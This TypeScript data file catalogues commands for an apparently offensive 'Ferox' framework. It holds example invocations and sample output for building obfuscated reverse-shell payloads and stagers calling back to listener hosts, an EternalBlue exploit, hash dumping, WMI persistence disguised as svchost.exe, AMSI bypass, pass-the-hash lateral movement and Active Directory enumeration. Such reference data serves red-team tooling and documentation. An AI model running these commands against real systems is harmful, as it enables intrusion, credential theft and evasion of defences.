// src/data/cli-commands.ts
// CLI commands database for Ferox Framework

import { CLICommand, ModuleCategory } from "@/types/cli-commands";

export const CLI_COMMANDS: CLICommand[] = [
  // ==================== PAYLOAD GENERATION ====================
  {
    id: "payload-build",
    module: "payload/builder",
    category: "payload",
    command: "ferox build",
    description: "Generate staged or stageless payloads for various platforms",
    parameters: [
      {
        name: "target",
        flag: "--target",
        type: "enum",
        required: true,
        description: "Target platform and architecture",
        options: [
          "windows/x64",
          "windows/x86",
          "linux/x64",
          "linux/arm64",
          "macos/x64",
          "macos/arm64",
        ],
      },
      {
        name: "format",
        flag: "--format",
        type: "enum",
        required: true,
        description: "Output format",
        options: ["exe", "dll", "shellcode", "ps1", "elf", "macho", "raw"],
      },
      {
        name: "lhost",
        flag: "--lhost",
        type: "string",
        required: true,
        description: "Listener host IP address",
      },
      {
        name: "lport",
        flag: "--lport",
        type: "number",
        required: true,
        default: 4444,
        description: "Listener port",
      },
      {
        name: "obfuscate",
        flag: "--obfuscate",
        type: "boolean",
        required: false,
        default: false,
        description: "Enable payload obfuscation",
      },
      {
        name: "output",
        flag: "--output",
        type: "string",
        required: false,
        description: "Output file path",
      },
      {
        name: "staged",
        flag: "--staged",
        type: "boolean",
        required: false,
        default: true,
        description: "Generate staged payload",
      },
      {
        name: "encrypt",
        flag: "--encrypt",
        type: "enum",
        required: false,
        description: "Encryption method",
        options: ["aes256", "chacha20", "xor", "none"],
      },
    ],
    examples: [
      {
        title: "Windows x64 EXE with obfuscation",
        command: `ferox build --target windows/x64 --format exe \\
  --lhost 192.168.1.100 \\
  --lport 4444 \\
  --obfuscate true \\
  --output ./payloads/update_installer.exe`,
        description: "Generate obfuscated Windows executable",
        output: "Build successful (42.5 KB)",
      },
      {
        title: "Linux shellcode",
        command: `ferox build --target linux/x64 --format shellcode \\
  --lhost 10.0.0.5 \\
  --lport 443 \\
  --encrypt aes256 \\
  --output ./payloads/stage1.bin`,
        description: "Generate encrypted Linux shellcode",
        output: "Build successful (8.2 KB)",
      },
      {
        title: "PowerShell stager",
        command: `ferox build --target windows/x64 --format ps1 \\
  --lhost attack.example.com \\
  --lport 8443 \\
  --staged true \\
  --obfuscate true`,
        description: "Generate obfuscated PowerShell stager",
        output: "Build successful (12.1 KB)",
      },
    ],
    tags: ["payload", "build", "generate", "windows", "linux", "macos"],
  },

  // ==================== PORT SCANNING ====================
  {
    id: "scan-ports",
    module: "recon/portscan",
    category: "reconnaissance",
    command: "ferox scan",
    description: "Perform port scanning with various techniques",
    parameters: [
      {
        name: "target",
        flag: "--target",
        type: "string",
        required: true,
        description: "Target IP, range, or CIDR",
      },
      {
        name: "ports",
        flag: "--ports",
        type: "string",
        required: false,
        default: "1-1000",
        description: "Port range (e.g., 1-1000, 22,80,443)",
      },
      {
        name: "technique",
        flag: "--technique",
        type: "enum",
        required: false,
        default: "syn",
        description: "Scan technique",
        options: ["syn", "connect", "udp", "fin", "null", "xmas", "ack"],
      },
      {
        name: "rate",
        flag: "--rate",
        type: "number",
        required: false,
        default: 1000,
        description: "Packets per second",
      },
      {
        name: "timeout",
        flag: "--timeout",
        type: "number",
        required: false,
        default: 3000,
        description: "Timeout in milliseconds",
      },
      {
        name: "service-detection",
        flag: "--service-detection",
        type: "boolean",
        required: false,
        default: true,
        description: "Enable service/version detection",
      },
    ],
    examples: [
      {
        title: "Quick SYN scan",
        command: `ferox scan --target 192.168.1.0/24 \\
  --ports 22,80,443,3389,8080 \\
  --technique syn \\
  --rate 5000`,
        description: "Fast SYN scan on common ports",
        output: "Found 47 open ports on 12 hosts",
      },
      {
        title: "Full port scan with service detection",
        command: `ferox scan --target 10.0.0.50 \\
  --ports 1-65535 \\
  --service-detection true \\
  --timeout 5000`,
        description: "Comprehensive scan with version detection",
        output: "Scan complete: 23 services identified",
      },
    ],
    tags: ["scan", "ports", "recon", "network", "discovery"],
  },

  // ==================== SESSION MANAGEMENT ====================
  {
    id: "session-list",
    module: "core/sessions",
    category: "c2",
    command: "ferox sessions",
    description: "Manage active sessions and connections",
    parameters: [
      {
        name: "list",
        flag: "--list",
        type: "boolean",
        required: false,
        description: "List all active sessions",
      },
      {
        name: "interact",
        flag: "-i",
        type: "number",
        required: false,
        description: "Interact with session by ID",
      },
      {
        name: "kill",
        flag: "-k",
        type: "number",
        required: false,
        description: "Kill session by ID",
      },
      {
        name: "upgrade",
        flag: "--upgrade",
        type: "number",
        required: false,
        description: "Upgrade session to Meterpreter-like",
      },
    ],
    examples: [
      {
        title: "List sessions",
        command: "ferox sessions --list",
        description: "Show all active sessions",
        output: `ID  Type     Host            User           PID    Arch
--  ----     ----            ----           ---    ----
1   shell    192.168.1.50    CORP\\admin     4532   x64
2   beacon   10.0.0.25       root           1337   x64
3   shell    172.16.0.10     SYSTEM         892    x86`,
      },
      {
        title: "Interact with session",
        command: "ferox sessions -i 1",
        description: "Drop into interactive shell",
        output: "[*] Interacting with session 1...\nferox-shell>",
      },
    ],
    tags: ["sessions", "c2", "shell", "management"],
  },

  // ==================== EXPLOITATION ====================
  {
    id: "exploit-run",
    module: "exploit/runner",
    category: "exploitation",
    command: "ferox exploit",
    description: "Run exploits against targets",
    parameters: [
      {
        name: "module",
        flag: "--module",
        type: "string",
        required: true,
        description: "Exploit module path",
      },
      {
        name: "target",
        flag: "--target",
        type: "string",
        required: true,
        description: "Target host",
      },
      {
        name: "port",
        flag: "--port",
        type: "number",
        required: false,
        description: "Target port",
      },
      {
        name: "payload",
        flag: "--payload",
        type: "string",
        required: false,
        description: "Payload to use",
      },
      {
        name: "check",
        flag: "--check",
        type: "boolean",
        required: false,
        description: "Check if target is vulnerable without exploiting",
      },
    ],
    examples: [
      {
        title: "Run EternalBlue",
        command: `ferox exploit --module windows/smb/ms17_010 \\
  --target 192.168.1.50 \\
  --payload windows/x64/shell_reverse_tcp \\
  --lhost 192.168.1.100 \\
  --lport 4444`,
        description: "Exploit MS17-010 vulnerability",
        output:
          "[+] Session 1 opened (192.168.1.100:4444 -> 192.168.1.50:49152)",
      },
      {
        title: "Check vulnerability",
        command: `ferox exploit --module windows/smb/ms17_010 \\
  --target 192.168.1.50 \\
  --check`,
        description: "Check if target is vulnerable",
        output: "[+] 192.168.1.50:445 - Host is VULNERABLE to MS17-010!",
      },
    ],
    tags: ["exploit", "attack", "vulnerability", "rce"],
  },

  // ==================== POST-EXPLOITATION ====================
  {
    id: "post-hashdump",
    module: "post/windows/hashdump",
    category: "post-exploitation",
    command: "ferox post hashdump",
    description: "Dump password hashes from Windows systems",
    parameters: [
      {
        name: "session",
        flag: "-s",
        type: "number",
        required: true,
        description: "Session ID to use",
      },
      {
        name: "method",
        flag: "--method",
        type: "enum",
        required: false,
        default: "registry",
        description: "Dump method",
        options: ["registry", "lsass", "sam", "ntds"],
      },
      {
        name: "output",
        flag: "--output",
        type: "string",
        required: false,
        description: "Output file for hashes",
      },
    ],
    examples: [
      {
        title: "Dump hashes via registry",
        command: `ferox post hashdump -s 1 \\
  --method registry \\
  --output ./loot/hashes.txt`,
        description: "Extract hashes from SAM registry",
        output: `[*] Dumping password hashes...
Administrator:500:aad3b435b51404ee:8846f7eaee8fb117...
Guest:501:aad3b435b51404ee:31d6cfe0d16ae931...
[+] 5 hashes saved to ./loot/hashes.txt`,
      },
    ],
    tags: ["post", "hashdump", "credentials", "windows", "loot"],
  },

  // ==================== PERSISTENCE ====================
  {
    id: "persist-wmi",
    module: "persist/windows/wmi",
    category: "persistence",
    command: "ferox persist wmi",
    description: "Establish WMI-based persistence",
    parameters: [
      {
        name: "session",
        flag: "-s",
        type: "number",
        required: true,
        description: "Session ID",
      },
      {
        name: "trigger",
        flag: "--trigger",
        type: "enum",
        required: false,
        default: "startup",
        description: "Trigger event",
        options: ["startup", "logon", "interval", "process"],
      },
      {
        name: "interval",
        flag: "--interval",
        type: "number",
        required: false,
        default: 900,
        description: "Interval in seconds (for interval trigger)",
      },
      {
        name: "payload-path",
        flag: "--payload-path",
        type: "string",
        required: true,
        description: "Path to payload on target",
      },
    ],
    examples: [
      {
        title: "WMI subscription persistence",
        command: `ferox persist wmi -s 1 \\
  --trigger interval \\
  --interval 900 \\
  --payload-path "C:\\Windows\\Temp\\svchost.exe"`,
        description: "Create WMI event subscription",
        output: `[+] WMI subscription created successfully
[*] Trigger: Every 900 seconds
[*] Target: DC-01.corp.local`,
      },
    ],
    tags: ["persist", "wmi", "windows", "stealth"],
  },

  // ==================== EVASION ====================
  {
    id: "evasion-amsi",
    module: "evasion/windows/amsi",
    category: "evasion",
    command: "ferox evasion amsi",
    description: "Bypass AMSI (Antimalware Scan Interface)",
    parameters: [
      {
        name: "session",
        flag: "-s",
        type: "number",
        required: true,
        description: "Session ID",
      },
      {
        name: "technique",
        flag: "--technique",
        type: "enum",
        required: false,
        default: "patch",
        description: "Bypass technique",
        options: ["patch", "unhook", "reflection", "hardware-bp"],
      },
    ],
    examples: [
      {
        title: "AMSI bypass via patching",
        command: "ferox evasion amsi -s 1 --technique patch",
        description: "Patch AMSI in current process",
        output: `[*] Targeting amsi.dll in process 4532
[+] AMSI bypass successful!`,
      },
    ],
    tags: ["evasion", "amsi", "bypass", "windows", "av"],
  },

  // ==================== LISTENER ====================
  {
    id: "listener-start",
    module: "listener/multi",
    category: "c2",
    command: "ferox listener",
    description: "Start and manage listeners",
    parameters: [
      {
        name: "type",
        flag: "--type",
        type: "enum",
        required: true,
        description: "Listener type",
        options: ["reverse_tcp", "reverse_https", "bind_tcp", "dns", "smb"],
      },
      {
        name: "host",
        flag: "--host",
        type: "string",
        required: true,
        description: "Listen host",
      },
      {
        name: "port",
        flag: "--port",
        type: "number",
        required: true,
        description: "Listen port",
      },
      {
        name: "ssl",
        flag: "--ssl",
        type: "boolean",
        required: false,
        default: false,
        description: "Enable SSL/TLS",
      },
      {
        name: "name",
        flag: "--name",
        type: "string",
        required: false,
        description: "Listener name",
      },
    ],
    examples: [
      {
        title: "Start HTTPS listener",
        command: `ferox listener --type reverse_https \\
  --host 0.0.0.0 \\
  --port 443 \\
  --ssl true \\
  --name "Main-C2"`,
        description: "Start encrypted HTTPS listener",
        output: `[*] Starting HTTPS listener on 0.0.0.0:443
[+] Listener "Main-C2" started successfully`,
      },
      {
        title: "Start DNS listener",
        command: `ferox listener --type dns \\
  --host 0.0.0.0 \\
  --port 53 \\
  --name "DNS-Tunnel"`,
        description: "Start DNS tunneling listener",
        output: `[*] Starting DNS listener on 0.0.0.0:53
[+] Listener "DNS-Tunnel" ready for connections`,
      },
    ],
    tags: ["listener", "c2", "reverse", "bind", "dns"],
  },

  // ==================== LATERAL MOVEMENT ====================
  {
    id: "lateral-psexec",
    module: "lateral/windows/psexec",
    category: "post-exploitation",
    command: "ferox lateral psexec",
    description: "Execute commands on remote Windows systems via PSExec",
    parameters: [
      {
        name: "target",
        flag: "--target",
        type: "string",
        required: true,
        description: "Target host",
      },
      {
        name: "user",
        flag: "--user",
        type: "string",
        required: true,
        description: "Username",
      },
      {
        name: "password",
        flag: "--password",
        type: "string",
        required: false,
        description: "Password (or use --hash)",
      },
      {
        name: "hash",
        flag: "--hash",
        type: "string",
        required: false,
        description: "NTLM hash for pass-the-hash",
      },
      {
        name: "command",
        flag: "--command",
        type: "string",
        required: false,
        description: "Command to execute",
      },
      {
        name: "payload",
        flag: "--payload",
        type: "string",
        required: false,
        description: "Deploy payload instead of command",
      },
    ],
    examples: [
      {
        title: "PSExec with credentials",
        command: `ferox lateral psexec \\
  --target 192.168.1.100 \\
  --user "CORP\\admin" \\
  --password "P@ssw0rd!" \\
  --payload windows/x64/shell_reverse_tcp`,
        description: "Move laterally using credentials",
        output: "[+] Session 2 opened on 192.168.1.100",
      },
      {
        title: "Pass-the-hash",
        command: `ferox lateral psexec \\
  --target DC-01.corp.local \\
  --user "Administrator" \\
  --hash "aad3b435b51404ee:8846f7eaee8fb117" \\
  --command "whoami"`,
        description: "PTH attack",
        output: "corp\\administrator",
      },
    ],
    tags: ["lateral", "psexec", "smb", "pth", "windows"],
  },

  // ==================== ENUMERATION ====================
  {
    id: "enum-ad",
    module: "enum/windows/ad",
    category: "reconnaissance",
    command: "ferox enum ad",
    description: "Active Directory enumeration",
    parameters: [
      {
        name: "session",
        flag: "-s",
        type: "number",
        required: true,
        description: "Session ID",
      },
      {
        name: "module",
        flag: "--module",
        type: "enum",
        required: false,
        default: "all",
        description: "Enumeration module",
        options: [
          "all",
          "users",
          "groups",
          "computers",
          "gpo",
          "acl",
          "trusts",
          "spn",
        ],
      },
      {
        name: "output",
        flag: "--output",
        type: "string",
        required: false,
        description: "Output directory",
      },
    ],
    examples: [
      {
        title: "Full AD enumeration",
        command: `ferox enum ad -s 1 \\
  --module all \\
  --output ./loot/ad-enum`,
        description: "Enumerate entire AD environment",
        output: `[*] Enumerating Active Directory...
[+] Found 2,847 users
[+] Found 156 groups
[+] Found 89 computers
[+] Found 23 GPOs
[+] Results saved to ./loot/ad-enum/`,
      },
      {
        title: "Find Kerberoastable accounts",
        command: "ferox enum ad -s 1 --module spn",
        description: "Find accounts with SPNs",
        output: `[+] Found 12 Kerberoastable accounts:
  - svc_sql (MSSQLSvc/db01.corp.local:1433)
  - svc_backup (HOST/backup01.corp.local)
  ...`,
      },
    ],
    tags: ["enum", "ad", "ldap", "windows", "domain"],
  },
];

// Helper function to get commands by category
export function getCommandsByCategory(category: ModuleCategory): CLICommand[] {
  return CLI_COMMANDS.filter((cmd) => cmd.category === category);
}

// Helper function to search commands
export function searchCommands(query: string): CLICommand[] {
  const lowerQuery = query.toLowerCase();
  return CLI_COMMANDS.filter(
    (cmd) =>
      cmd.command.toLowerCase().includes(lowerQuery) ||
      cmd.description.toLowerCase().includes(lowerQuery) ||
      cmd.tags.some((tag) => tag.includes(lowerQuery))
  );
}

// Get command by module
export function getCommandByModule(module: string): CLICommand | undefined {
  return CLI_COMMANDS.find((cmd) => cmd.module === module);
}

// Get command by id
export function getCommandById(id: string): CLICommand | undefined {
  return CLI_COMMANDS.find((cmd) => cmd.id === id);
}
